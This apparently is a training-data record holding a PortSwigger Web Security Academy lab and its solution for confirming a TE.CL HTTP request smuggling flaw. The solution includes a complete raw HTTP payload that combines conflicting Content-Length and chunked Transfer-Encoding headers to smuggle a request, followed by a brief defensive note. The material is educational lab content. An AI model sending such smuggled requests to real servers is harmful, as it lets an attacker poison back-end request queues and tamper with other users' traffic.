# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

How do I solve this PortSwigger Web Security Academy lab?

Title: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Difficulty: Practitioner
Category: HTTP request smuggling

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

Note

 Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers HTTP request smuggling: "HTTP request smuggling, confirming a TE.CL vulnerability via differential responses".

## Solution steps

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

 Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`

 The second request should receive an HTTP 404 response.

## Vulnerability note

Underlying issue: HTTP request smuggling (CWE-444). Use a consistent, well-configured front-end/back-end HTTP stack; reject ambiguous Transfer-Encoding/Content-Length combinations.
